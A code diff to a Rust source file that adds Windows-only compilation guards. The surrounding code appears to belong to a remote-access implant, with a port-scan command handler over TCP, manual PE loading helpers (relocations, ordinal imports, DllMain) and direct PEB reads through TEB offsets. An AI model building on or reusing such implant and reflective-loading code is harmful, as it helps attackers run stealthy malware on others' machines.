@@ -13,8 +13,11 @@ use std::{
     u8,
 };
 
+#[cfg(windows)]
 use std::{ffi::c_void, arch::asm};
+#[cfg(windows)]
 use ntapi::ntpebteb::{PEB, TEB};
+#[cfg(windows)]
 use windows::Win32::{
     Foundation::{BOOL, HINSTANCE},
     System::Kernel::NT_TIB
@@ -295,15 +298,20 @@ pub fn handle_portscan(stream: &mut TcpStream, command: &str, shared_secret: &[u
 }
 
 // windows utils
+#[cfg(windows)]
 const IMAGE_ORDINAL_FLAG64: u64 = 0x8000000000000000;
+#[cfg(windows)]
 pub type Main = unsafe extern "system" fn() -> BOOL;
+#[cfg(windows)]
 pub type DllMain = unsafe extern "system" fn(HINSTANCE, u32, *mut c_void) -> BOOL;
 
+#[cfg(windows)]
 #[derive(Debug, Clone, Copy)]
 pub struct BaseRelocationEntry {
     pub data: u16,
 }
 
+#[cfg(windows)]
 impl BaseRelocationEntry {
     pub fn offset(&self) -> u16 {
         self.data & 0x0FFF
@@ -314,14 +322,17 @@ impl BaseRelocationEntry {
     }
 }
 
+#[cfg(windows)]
 pub fn image_snap_by_ordinal(ordinal: u64) -> bool {
     ordinal & IMAGE_ORDINAL_FLAG64 != 0
 }
 
+#[cfg(windows)]
 pub fn image_ordinal(ordinal: u64) -> u64 {
     ordinal & 0xffff
 }
 
+#[cfg(windows)]
 pub unsafe fn get_peb() -> *mut PEB {
     let teb_offset = ntapi::FIELD_OFFSET!(NT_TIB, Self_) as u32;
 
@@ -338,6 +349,7 @@ pub unsafe fn get_peb() -> *mut PEB {
     }
 }
 
+#[cfg(windows)]
 #[cfg(target_arch = "x86_64")]
 unsafe fn __readgsqword(offset: u32) -> u64 {
 
@@ -351,6 +363,7 @@ unsafe fn __readgsqword(offset: u32) -> u64 {
     output
 }
 
+#[cfg(windows)]
 #[cfg(target_arch = "x86")]
 unsafe fn __readfsdword(offset: u32) -> u32 {
     let output: u32;
